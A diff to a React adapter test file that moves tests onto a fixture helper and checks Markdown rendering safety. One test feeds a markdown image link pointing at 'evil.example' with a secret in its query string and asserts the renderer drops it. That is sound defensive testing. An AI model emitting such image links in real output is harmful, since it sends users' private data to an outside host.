@@ -7,70 +7,55 @@ import { defineView } from "@copilotz/copilotz/views";
 import type { BrowserViewContext } from "@copilotz/copilotz/web";
 import {
   MemorySubscriptions,
-  record,
   tick,
 } from "../../../client/testing/live-transport.test.ts";
+import { FixtureLive } from "../../ui/tests/fixture-live.test.ts";
 import { renderToStaticMarkup } from "react-dom/server";
 import { test } from "node:test";
 import assert from "node:assert/strict";
-import {
-  type BrowserRuntime,
-  createBrowserRuntime,
-} from "@copilotz/copilotz/web";
-import {
-  coreWebPlugin,
-  messageReadSelection,
-} from "@copilotz/copilotz/core/web";
+import { createBrowserRuntime } from "@copilotz/copilotz/web";
+import { coreWebPlugin } from "@copilotz/copilotz/core/web";
 import { adminWebPlugin } from "@copilotz/copilotz/admin/web";
 import { usageWebPlugin } from "@copilotz/copilotz/usage/web";
-import { uiWebPlugin, workspaceNavigation } from "@copilotz/copilotz/ui/web";
 import { Button, Markdown } from "@copilotz/copilotz/web/kit";
 import { ObservedView, reactRenderer } from "../index.ts";
 
-test("React adapter server renders tracked chat/admin/usage screens in both densities", async () => {
-  const live = new MemorySubscriptions();
-  const publish = (
-    collection: string,
-    query: Record<string, unknown> | undefined,
-    rows: Record<string, unknown>[],
-    id?: string,
-  ) =>
-    live.publish({
-      collection,
-      ...(collection === "message" ? messageReadSelection : {}),
-      ...(query ? { query } : {}),
-      ...(id ? { id } : {}),
-    }, {
-      t: "snapshot",
-      complete: true,
-      rows: rows.map((row) => record(row as { id: string })),
-      sequence: "1",
-      checkpoint: "1",
-    });
-  publish("thread", undefined, [{ id: "t", name: "A conversation" }], "t");
-  publish("thread", { limit: 100 }, [{ id: "t", name: "A conversation" }]);
-  publish("message", {
-    where: { threadId: "t" },
-    order: { field: "createdAt", direction: "desc" },
-    limit: 100,
-  }, [{
-    id: "m",
-    content: [{
-      assetId: "body",
-      kind: "text",
-      role: "message",
-      mediaType: "text/plain",
-      value: "Hello **reader**",
+const fixtures = (content: string) =>
+  new FixtureLive({
+    thread: [{
+      id: "t",
+      name: "A conversation",
+      status: "active",
+      participantIds: ["p", "a"],
     }],
-    role: "assistant",
-  }]);
-  publish("participant", { limit: 100 }, [{ id: "p", name: "Reader" }]);
-  publish("usage", { limit: 100 }, [{
-    id: "u",
-    model: "Example model",
-    totalTokens: 123,
-    totalCostUsd: .01,
-  }]);
+    message: [{
+      id: "m",
+      threadId: "t",
+      senderId: "a",
+      createdAt: "2026-10-20T10:00:00.000Z",
+      content: [{
+        assetId: "body",
+        kind: "text",
+        role: "body",
+        mediaType: "text/markdown",
+        value: content,
+      }],
+      metadata: {},
+    }],
+    participant: [
+      { id: "p", participantType: "human", name: "Reader" },
+      { id: "a", participantType: "agent", agentId: "a", name: "Writer" },
+    ],
+    usage: [{
+      id: "u",
+      model: "Example model",
+      totalTokens: 123,
+      totalCostUsd: .01,
+    }],
+  });
+
+test("React adapter server renders tracked chat/admin/usage screens in both densities", async () => {
+  const live = fixtures("Hello **reader**");
   const runtime = await createBrowserRuntime({
     renderer: reactRenderer,
     plugins: [coreWebPlugin, adminWebPlugin, usageWebPlugin],
@@ -80,15 +65,15 @@ test("React adapter server renders tracked chat/admin/usage screens in both dens
     for (
       const [shows, value, expected] of [
         ["thread", { id: "t" }, "Hello <strong>reader</strong>"],
+        ["thread", { id: "t" }, "Writer"],
         ["admin", null, "Administration"],
-        ["thread", { id: "t" }, "A conversation"],
-        [{ list: "thread" }, null, "A conversation"],
         ["usage", null, "123"],
       ] as const
     ) {
       const output = runtime.observe(() =>
         runtime.render({ shows, value }, { mode })
       );
+      await tick();
       await tick();
       const html = renderToStaticMarkup(<ObservedView output={output} />);
       assert.ok(html.includes(expected), html);
@@ -97,62 +82,7 @@ test("React adapter server renders tracked chat/admin/usage screens in both dens
     }
   }
   runtime.dispose();
-  assert.equal(live.subscriptions, 0);
-});
-
-test("workspace restores panes, navigation chooses focus/context, and swap exchanges density", async () => {
-  const runtime: BrowserRuntime = await createBrowserRuntime({
-    renderer: reactRenderer,
-    plugins: [
-      coreWebPlugin,
-      adminWebPlugin,
-      usageWebPlugin,
-      uiWebPlugin("url"),
-    ],
-    live: new MemorySubscriptions(),
-    show: workspaceNavigation(() => runtime),
-    storage: {
-      url: {
-        load: () => [{
-          id: "main",
-          focus: { shows: "admin", value: null },
-          context: null,
-        }],
-        save() {},
-      },
-    },
-  });
-  await runtime.actions.uiOpen({
-    reference: { shows: "usage", value: null },
-    source: "link",
-  }).result();
-  const output = runtime.observe(() =>
-    runtime.render({ shows: "workspace", value: null })
-  );
-  let html = renderToStaticMarkup(<ObservedView output={output} />);
-  assert.ok(html.includes('aria-label="Context"'));
-  assert.ok(html.includes('data-density="panel"'));
-  assert.ok(html.includes("Search ⌘K"));
-  await runtime.actions.uiSwap({}).result();
-  assert.equal(
-    (runtime.collections.workspace.get("main").value?.focus as {
-      shows: string;
-    }).shows,
-    "usage",
-  );
-  await runtime.actions.uiOpen({
-    reference: { shows: "admin", value: null },
-    source: "command",
-  }).result();
-  assert.equal(
-    (runtime.collections.workspace.get("main").value?.focus as {
-      shows: string;
-    }).shows,
-    "admin",
-  );
-  html = renderToStaticMarkup(<ObservedView output={output} />);
-  assert.ok(html.includes("Administration"));
-  runtime.dispose();
+  assert.equal(live.subscriptionCount, 0);
 });
 
 test("shared Markdown rejects raw HTML and unsafe URLs while preserving escaped code", () => {
@@ -189,15 +119,6 @@ test("shared Markdown rejects raw HTML and unsafe URLs while preserving escaped 
 });
 
 test("message Markdown loads remote images only from the app's resources.markdown.imageOrigins", async () => {
-  const message = {
-    shows: "message",
-    value: {
-      id: "m",
-      role: "assistant",
-      content:
-        "![chart](https://cdn.example/a.png) ![leak](https://evil.example/?q=secret)",
-    },
-  };
   for (const imageOrigins of [undefined, ["https://cdn.example"]]) {
     const runtime = await createBrowserRuntime({
       renderer: reactRenderer,
@@ -205,10 +126,16 @@ test("message Markdown loads remote images only from the app's resources.markdow
         id: "app",
         resources: imageOrigins ? { markdown: { imageOrigins } } : {},
       }],
-      live: new MemorySubscriptions(),
+      live: fixtures(
+        "![chart](https://cdn.example/a.png) ![leak](https://evil.example/?q=secret)",
+      ),
     });
     try {
-      const output = runtime.observe(() => runtime.render(message));
+      const output = runtime.observe(() =>
+        runtime.render({ shows: "thread", value: { id: "t" } })
+      );
+      await tick();
+      await tick();
       const html = renderToStaticMarkup(<ObservedView output={output} />);
       output.dispose();
       assert.doesNotMatch(html, /evil\.example/);
@@ -216,7 +143,7 @@ test("message Markdown loads remote images only from the app's resources.markdow
       if (imageOrigins) {
         assert.match(html, /<img [^>]*src="https:\/\/cdn\.example\/a\.png"/);
       } else {
-        assert.doesNotMatch(html, /<img/);
+        assert.doesNotMatch(html, /<img [^>]*cdn/);
         assert.match(html, />chart</);
       }
     } finally {
